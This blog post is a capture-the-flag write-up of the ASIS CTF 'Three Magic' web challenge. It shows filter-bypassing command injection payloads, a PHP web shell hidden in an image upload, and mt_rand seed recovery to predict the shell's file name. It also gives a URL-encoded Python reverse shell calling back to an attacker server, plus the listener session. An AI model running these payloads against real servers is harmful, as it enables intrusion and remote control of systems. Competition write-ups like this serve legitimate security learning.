---
layout: post
title: ASIS CTF - Three Magic [WEB]
author: pimps
tags: [ctf, asisctf, web]
---

 * Competition: ASIS CTF
 * Challenge Name: Three Magic
 * Type: Web
 * Points: 267 pts
 * URL: https://3magic.asis-ctf.ir/3magic/

<!--more-->

The challenge looks like a usual Command Injection but with some filters and restrictions. To confirm the Command Injection we inserted &id into the addr field and we can observe that the command was executed with success:

![alt](https://i.imgur.com/ZxP2UOl.png)

The next step was discover the filters and restrictions. We are able to discover that we can't use: `[space]` or `/` and we have only 15 chars! -_-

Running the commands find and set we discovered some informations of the server:

Result of the command find:

```
.
./index.php
./pages
./pages/ping.php
./pages/Adm1n1sTraTi0n2.php
./files
find: `./files': Permission denied
```

As we can see, we have a folder `/pages` where the .php files of the challenge are stored. A folder `/files` where we can't have access. Finally we can observe also a new page: `Adm1n1sTraTi0n2.php`

![alt](https://i.imgur.com/uL1tJDf.png)

First step was try to upload a .php shell and we could observe that exist some filter (not so fast mate :-p). Uploading a image we could observe that the challenge accepted the image but just returned like the result of a command `file image.png` but don't let us know where the file was saved... Ok lets step back and try read the source code of the .php files in the challenge!

Since we can't use the characters `[space]` or `/` I used the following payload `{command,param1,param2,...}`. So to grep the content of the files recursively I used: `&{grep,-nrw,.}`

Here is the codes of the challenge:

```php
index.php
---------
<title>3magic</title>
  <li>
    <a href='?page=ping'>ping</a>
  </li>
  <?php
    if ($_SERVER['REMOTE_ADDR'] == '127.0.0.1') {
  ?>
      <li>
      <a href='?page=Adm1n1sTraTi0n2'>admin</a>
      </li>
  <?php
    }
  ?>
  <hr>
  <?php
  if (isset($_GET['page'])) {
    $p = $_GET['page'];
    if (preg_match('/(:\/\/)/', $p)) {
      die('attack detected');
    }
    include("pages/".$p.".php");
    die();
  }
  ?>
ping.php
--------
<p>ping</p>
<form action="./?page=ping" method="POST">
  <input type="text" name="addr" placeholder="addr">
  <input type="submit" value="send">
</form>
<textarea style="width: 300px; height: 300px" placeholder="result">
<?php
if (isset($_POST['addr'])) {
  $addr = $_POST['addr'];
  if (preg_match('/[`;$()| \/\'>"\t]/', $addr)) {
    die("invalid character detected");
  }
  if (strpos($addr, ".php") !== false){
    die("invalid character detected");
  }
  if (strlen($addr) > 15) {
    die("addr is too long");
  }
  @system("timeout 2 bash -c 'ping -c 1 $addr' 2>&1");
}
?>
</textarea>
```

```php
Adm1n1sTraTi0n2.php
-------------------
<p>image inspector</p>
<?php
mt_srand((time() % rand(1,10000) + rand(2000,5000))%rand(1000,9000)+rand(2000,5000));
// files directory flushed every 3min
setcookie('test', mt_rand(), time(), '/');
if (isset($_POST['submit'])) {
  $check = getimagesize($_FILES['file']['tmp_name']);
  if($check !== false) {
    echo 'File is an image - ' . $check['mime'];
    $filename = '/var/www/html/3magic/files/'.mt_rand().'_'.$_FILES['file']['name']; // prevent path traversal
    move_uploaded_file($_FILES['file']['tmp_name'], $filename);
    echo "<br>\n";
    system('/usr/bin/file -b '.escapeshellarg($filename));
    echo "<br>\n";
  } else {
    echo "File is not an image";
  }
}
?>
<form action="?page=Adm1n1sTraTi0n2" method="post" enctype="multipart/form-data">
  Select image to upload:
  <input type="file" name="file">
  <input type="submit" value="Upload Image" name="submit">
</form>
```

Reading the code we can have some conclusions:

 * **Related to index.php:**
    * The parameter page is vulnerable to LFI but we can't abuse this because the installed PHP is already patched against null byte poisoning don't allowing us to use the `%00` to kill the suffix .php and also have a protection to avoid the use of `://` that don't allow us to use any wrappers or filters.
 * **Related to Adm1n1sTraTi0n2.php:**
    * The image check only validates the size of the image via `getsizeimage()` function, and saves the uploaded file with the same name that we sent concatenating with a random value.
    * The app loads the `mt_srand()` when we visit the page with a random seed. After that includes the first `mt_rand()` in the cookie and uses the second mt_rand() to concatenate with the name of the uploaded file and saves the file into the folder `/files`. The code also informs that the folder `/files` is erased every 3 minutes.
The `mt_rand()` have a well-know vulnerability that we can recover the seed from any `mt_rand()` value. To understand better this vulnerability and learn how to attack it please [read this paper](https://www.openwall.com/php_mt_seed/README). You can also download the `php_mt_seed` tool [here](https://download.openwall.net/pub/projects/php_mt_seed/php_mt_seed-3.2.tar.gz)!

With those informations the attack plan is clear:

 * We need upload a .php file that is actually a valid image file with a php code in the end of this image `<?php system($_GET['c']); ?>`. That way we will be able to bypass the `getsizeimage()` and upload a shell.php file to the directory `/files`
 * Get the `mt_rand()` value in the cookie and use the tool php_mt_seed to recover the seed.
 * Print 2 `mt_rand()` using the recovered seed to discover the value concatenated in the `shell.php` file.
 * Access the uploaded `shell.php` file and get a connect back.
 * Do all of those steps in 3 minutes!
 * Uploading the `image.php` shell.

![alt](https://i.imgur.com/acuVPaz.png)

Executing the `php_mt_seed` with the value received in the cookie:

```bash
vagrant@vagrant-ubuntu-trusty-64:~/php_mt_seed-3.2$ ./php_mt_seed 1661750892
Found 0, trying 0 - 33554431, speed 0 seeds per second
seed = 6658
```

Recovering the second `mt_rand()` using the discovered seed.

```bash
vagrant@vagrant-ubuntu-trusty-64:~/ctf$ php -r 'mt_srand(6658); echo mt_rand(), "\n";echo mt_rand();'
1661750892
350321027
```

Getting a python connect-back shell using the uploaded php shell.

```
https://3magic.asis-ctf.ir/3magic/files/350321027_image.php?c=python%20-c%20%27import%20socket,subprocess,os;s=socket.socket%28socket.AF_INET,socket.SOCK_STREAM%29;s.connect%28%28%22[MY_SERVER]%22,80%29%29;os.dup2%28s.fileno%28%29,0%29;%20os.dup2%28s.fileno%28%29,1%29;%20os.dup2%28s.fileno%28%29,2%29;p=subprocess.call%28[%22/bin/sh%22,%22-i%22]%29;%27
```

Receiving the connect-back and dropping a python tty to get the flag.

```bash
root@pimps:~# nc -lvp 80
Listening on [0.0.0.0] (family 0, port 80)
Connection from [66.172.11.62] port 80 [tcp/http] accepted (family 2, sport 52079)
/bin/sh: 0: can't access tty; job control turned off
$
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ uname -a
Linux web-tasks 3.16.0-4-amd64 #1 SMP Debian 3.16.7-ckt25-2 (2016-04-08) x86_64 GNU/Linux
$ cd /
$ ls
bin
boot
dev
etc
flag
home
initrd.img
initrd.img.old
lib
lib32
lib64
lost+found
media
mnt
opt
proc
read_flag
root
run
sbin
srv
sys
tmp
usr
var
vmlinuz
vmlinuz.old
$ ./read_flag
Segmentation fault

$ python -c 'import pty; pty.spawn("/bin/bash")'
www-data@web-tasks:/$
www-data@web-tasks:/$ ./read_flag
./read_flag
Write "*please_show_me_your_flag*" on my tty, and I will give you flag :)
*please_show_me_your_flag*
*please_show_me_your_flag*
ASIS{015c6456955c3c44b46d8b23d8a3187c}

www-data@web-tasks:/$
```

Hope you enjoyed the reading!


